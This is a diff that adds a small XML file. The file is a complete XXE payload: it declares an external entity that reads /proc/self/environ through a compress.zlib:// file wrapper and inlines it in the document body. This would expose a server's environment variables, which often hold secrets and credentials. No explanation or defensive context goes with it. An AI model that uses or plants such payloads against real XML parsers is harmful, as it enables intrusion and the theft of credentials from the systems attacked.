@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "compress.zlib://file:///proc/self/environ">]>
+<r><meta name="description" content="ZKR3"/>&xxe;</r>
